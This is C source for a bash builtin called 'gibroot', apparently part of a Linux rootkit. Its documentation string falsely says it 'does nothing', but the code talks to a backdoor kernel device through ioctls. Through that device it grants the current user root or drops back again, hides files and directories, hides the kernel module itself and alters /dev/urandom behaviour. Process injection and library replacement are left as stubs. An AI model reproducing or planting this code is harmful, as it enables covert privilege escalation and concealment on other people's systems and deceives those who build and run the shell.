$PRODUCES gibroot.c
$BUILTIN gibroot
$FUNCTION gibroot_builtin
$SHORT_DOC gibroot [cmd] [arg ...]
does nothing
:-)
$END

#include <config.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <libgen.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "../bashtypes.h"
#include "../bashintl.h"
#include "../shell.h"
#include "common.h"
#include "../../bdoor_common.h"

#define ROOT_CMD "root"
#define UNROOT_CMD "unroot"
#define URAND_CMD "urand"
#define HIDE_CMD "hide"
#define SHOW_CMD "show"
#define LIST_HIDDEN_CMD "list"
#define INJECT_CMD "inject"
#define REPLACE_CMD "replace"
#define HIDE_MOD_CMD "hmod"
#define SHOW_MOD_CMD "smod"


#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

static int backdoor_fd;

static int open_device(void)
{
	backdoor_fd = open(BDOOR_DEV_PATH,O_RDONLY);
	printf("file descriptor:%d\n",backdoor_fd);
	if (backdoor_fd == -1)
		return -1;
	return 0;
}

static void close_device(void)
{
	close(backdoor_fd);
}

static int make_root(list) WORD_LIST *list;
{
	int res;
	int ret;
	printf("uid before ioctl:%lu\n",getuid());
	res = ioctl(backdoor_fd,ROOT_IOCTL,NULL);
	printf("uid after ioctl:%lu\n",getuid());
	if (res == 0) {
		printf("successfully rooted user\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR ROOTING USER");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int make_unroot(list) WORD_LIST *list;
{
	int res;
	int ret;
	printf("uid before ioctl:%lu\n",getuid());
	res = ioctl(backdoor_fd,UNROOT_IOCTL,NULL);
	printf("uid after ioctl:%lu\n",getuid());
	if (res == 0) {
		printf("successfully restored user creds\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR RESTORING USER CREDS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int toggle_urandom(list) WORD_LIST *list;
{
	int res;
	int ret;
	//printf("not yet implemented\n");
	res = ioctl(backdoor_fd,URAND_IOCTL,NULL);
	if (res == 0) {
		printf("successfully toggled urandom behaviour\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR TOGGLING URANDOM BEHAVIOUR");
		ret = EXECUTION_FAILURE;
	}
	return 0;
}

void init_request(struct hide_request *request)
{
        request->count = 0;
        request->idents = NULL;
}

void add_request(struct hide_request *request,
                int len,char *name,
                dev_t dev, unsigned long par_ino)
{
	struct dentry_identifier new_ident = {
                .name_len = len,
                .device = dev,
                .parent_ino = par_ino,
        };
	strncpy(new_ident.name,name,256);

	request->count++;
        request->idents = realloc(request->idents, //done since reallocarray doesn't seem to be available
				request->count * sizeof(struct dentry_identifier));

	memcpy(&request->idents[request->count - 1],&new_ident,sizeof(struct dentry_identifier));
}

void free_request(struct hide_request *request)
{
        free(request->idents);
}

static int get_parent_stuff(char *path,dev_t *parent_dev,
		ino_t *parent_ino,DIR **parent_dir)
{
	int ret = 0;
	char *dname;
	struct stat parent_stat;
	char *path_cpy = calloc((strlen(path) + 1),sizeof(char));
	strcpy(path_cpy,path);//THIS ISN'T GREAT
	dname = dirname(path_cpy);
	if (stat(dname,&parent_stat)) {
		perror("ERROR GETTING PARENT DIRECTORY");
		ret = -1;
		goto out;
	}
	*parent_dev = parent_stat.st_dev;
	*parent_ino = parent_stat.st_ino;
	//printf("parent ino:%lu\n",*parent_ino);
	*parent_dir = opendir(dname);
out:
	free(path_cpy);
	return ret;
}

static void get_basename_stuff(char *path,char **bname)
{
	char *path_cpy = calloc((strlen(path) + 1), sizeof(char));
	char *base_ptr;
	strcpy(path_cpy,path);//THIS ISN'T GREAT
	base_ptr = basename(path_cpy);
	*bname = calloc((strlen(base_ptr) + 1), sizeof(char));//MAKE SURE THAT THIS WILL BE AT MOST 256 BYTES
	printf("base_ptr len:%d\n",strlen(base_ptr));
	strncpy(*bname,base_ptr,MIN(strlen(base_ptr),255));
	free(path_cpy);
}

static int construct_request(char *path, struct hide_request *req)
{
	DIR *parent_dir;
	dev_t parent_dev;
	ino_t parent_ino;
	//struct dirent *cur;
	char *bname;
	int ret = 0;
	ret = get_parent_stuff(path,
			&parent_dev,
			&parent_ino,
			&parent_dir);
	if (ret)
		goto out;

	get_basename_stuff(path,&bname);
	add_request(req,
		strlen(bname),
		bname,
		parent_dev,parent_ino);

	printf("bname: %s\n",bname);
	//printf("not yet implemented\n");
	free(bname);
out:
	return ret;
}

static int hide_item(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct hide_request req;
	char *word;

	init_request(&req);

	while (list != NULL) {
		word = list->word->word;
		printf("current item: %s\n",word);
		if(construct_request(word,&req))
			goto err_out;
		list = list->next;
	}
	printf("finished adding items\n");
	printf("parent ino:%lu\n",req.idents[0].parent_ino);
	res = ioctl(backdoor_fd,HIDE_IOCTL,&req);
	free_request(&req);

	if (res == 0) {
		printf("successfully hid items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR HIDING ITEMS");
		ret = EXECUTION_FAILURE;
	}
	printf("not yet implemented\n");
	return 0;
err_out:
	if (req.count)
		free_request(&req);
	return EXECUTION_FAILURE;
}

static int show_item(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct hide_request req;
	char *word;

	init_request(&req);

	while (list != NULL) {
		word = list->word->word;
		printf("current item: %s\n",word);
		if(construct_request(word,&req))
			goto err_out;
		list = list->next;
	}
	printf("finished adding items\n");
	printf("parent ino:%lu\n",req.idents[0].parent_ino);
	res = ioctl(backdoor_fd,SHOW_IOCTL,&req);
	free_request(&req);

	if (res == 0) {
		printf("successfully unhid items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR UNHIDING ITEMS");
		ret = EXECUTION_FAILURE;
	}
	printf("not yet implemented\n");
	return 0;
err_out:
	if (req.count)
		free_request(&req);
	return EXECUTION_FAILURE;
}

static int list_hidden_items(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int inject_pid(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int replace_libs(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int hide_mod(list) WORD_LIST *list;
{
	int ret;
	int res;
	res = ioctl(backdoor_fd,HIDE_MOD_IOCTL,NULL);
	if (res == 0) {
		printf("successfully hid kernel module\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR HIDING MODULE");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int show_mod(list) WORD_LIST *list;
{
	int ret;
	int res;
	res = ioctl(backdoor_fd,SHOW_MOD_IOCTL,NULL);
	if (res == 0) {
		printf("successfully unhid kernel module\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR UNHIDING MODULE");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int get_first_arg(list) WORD_LIST *list;
{
	char *word = list->word->word;
	if (!strncmp(word,ROOT_CMD,strlen(ROOT_CMD))) {
		return make_root(list->next);
	} else if (!strncmp(word,UNROOT_CMD,strlen(UNROOT_CMD))) {
		return make_unroot(list->next);
	} else if (!strncmp(word,URAND_CMD,strlen(URAND_CMD))) {
		return toggle_urandom(list->next);
	} else if (!strncmp(word,HIDE_CMD,strlen(HIDE_CMD))) {
		return hide_item(list->next);
	} else if (!strncmp(word,SHOW_CMD,strlen(SHOW_CMD))) {
		return show_item(list->next);
	} else if (!strncmp(word,LIST_HIDDEN_CMD,strlen(LIST_HIDDEN_CMD))) {
		return list_hidden_items(list->next);
	} else if (!strncmp(word,INJECT_CMD,strlen(INJECT_CMD))) {
		return inject_pid(list->next);
	} else if (!strncmp(word,REPLACE_CMD,strlen(REPLACE_CMD))) {
		return replace_libs(list->next);
	} else if (!strncmp(word,HIDE_MOD_CMD,strlen(HIDE_MOD_CMD))) {
		return hide_mod(list->next);
	} else if (!strncmp(word,SHOW_MOD_CMD,strlen(SHOW_MOD_CMD))) {
		return show_mod(list->next);
	} else {
		printf("ERROR: invalid command\n");
		return EXECUTION_FAILURE;
	}
}

int gibroot_builtin(list) WORD_LIST *list;
{
	int ret = 0;
	printf("sizeof ino_t:%ld\n",sizeof(ino_t));
	printf("sizeof dev_t:%ld\n",sizeof(dev_t));
	if (open_device() == -1) {
		printf("ERROR: backend device not registered\n");
		ret = EXECUTION_FAILURE;
		goto out;
	}
	if (list == 0) {
		printf("ERROR: need at least one argument\n");
		ret = EXECUTION_FAILURE;
	} else {
		ret = get_first_arg(list);
	}
	close_device();
out:
	return ret;
}
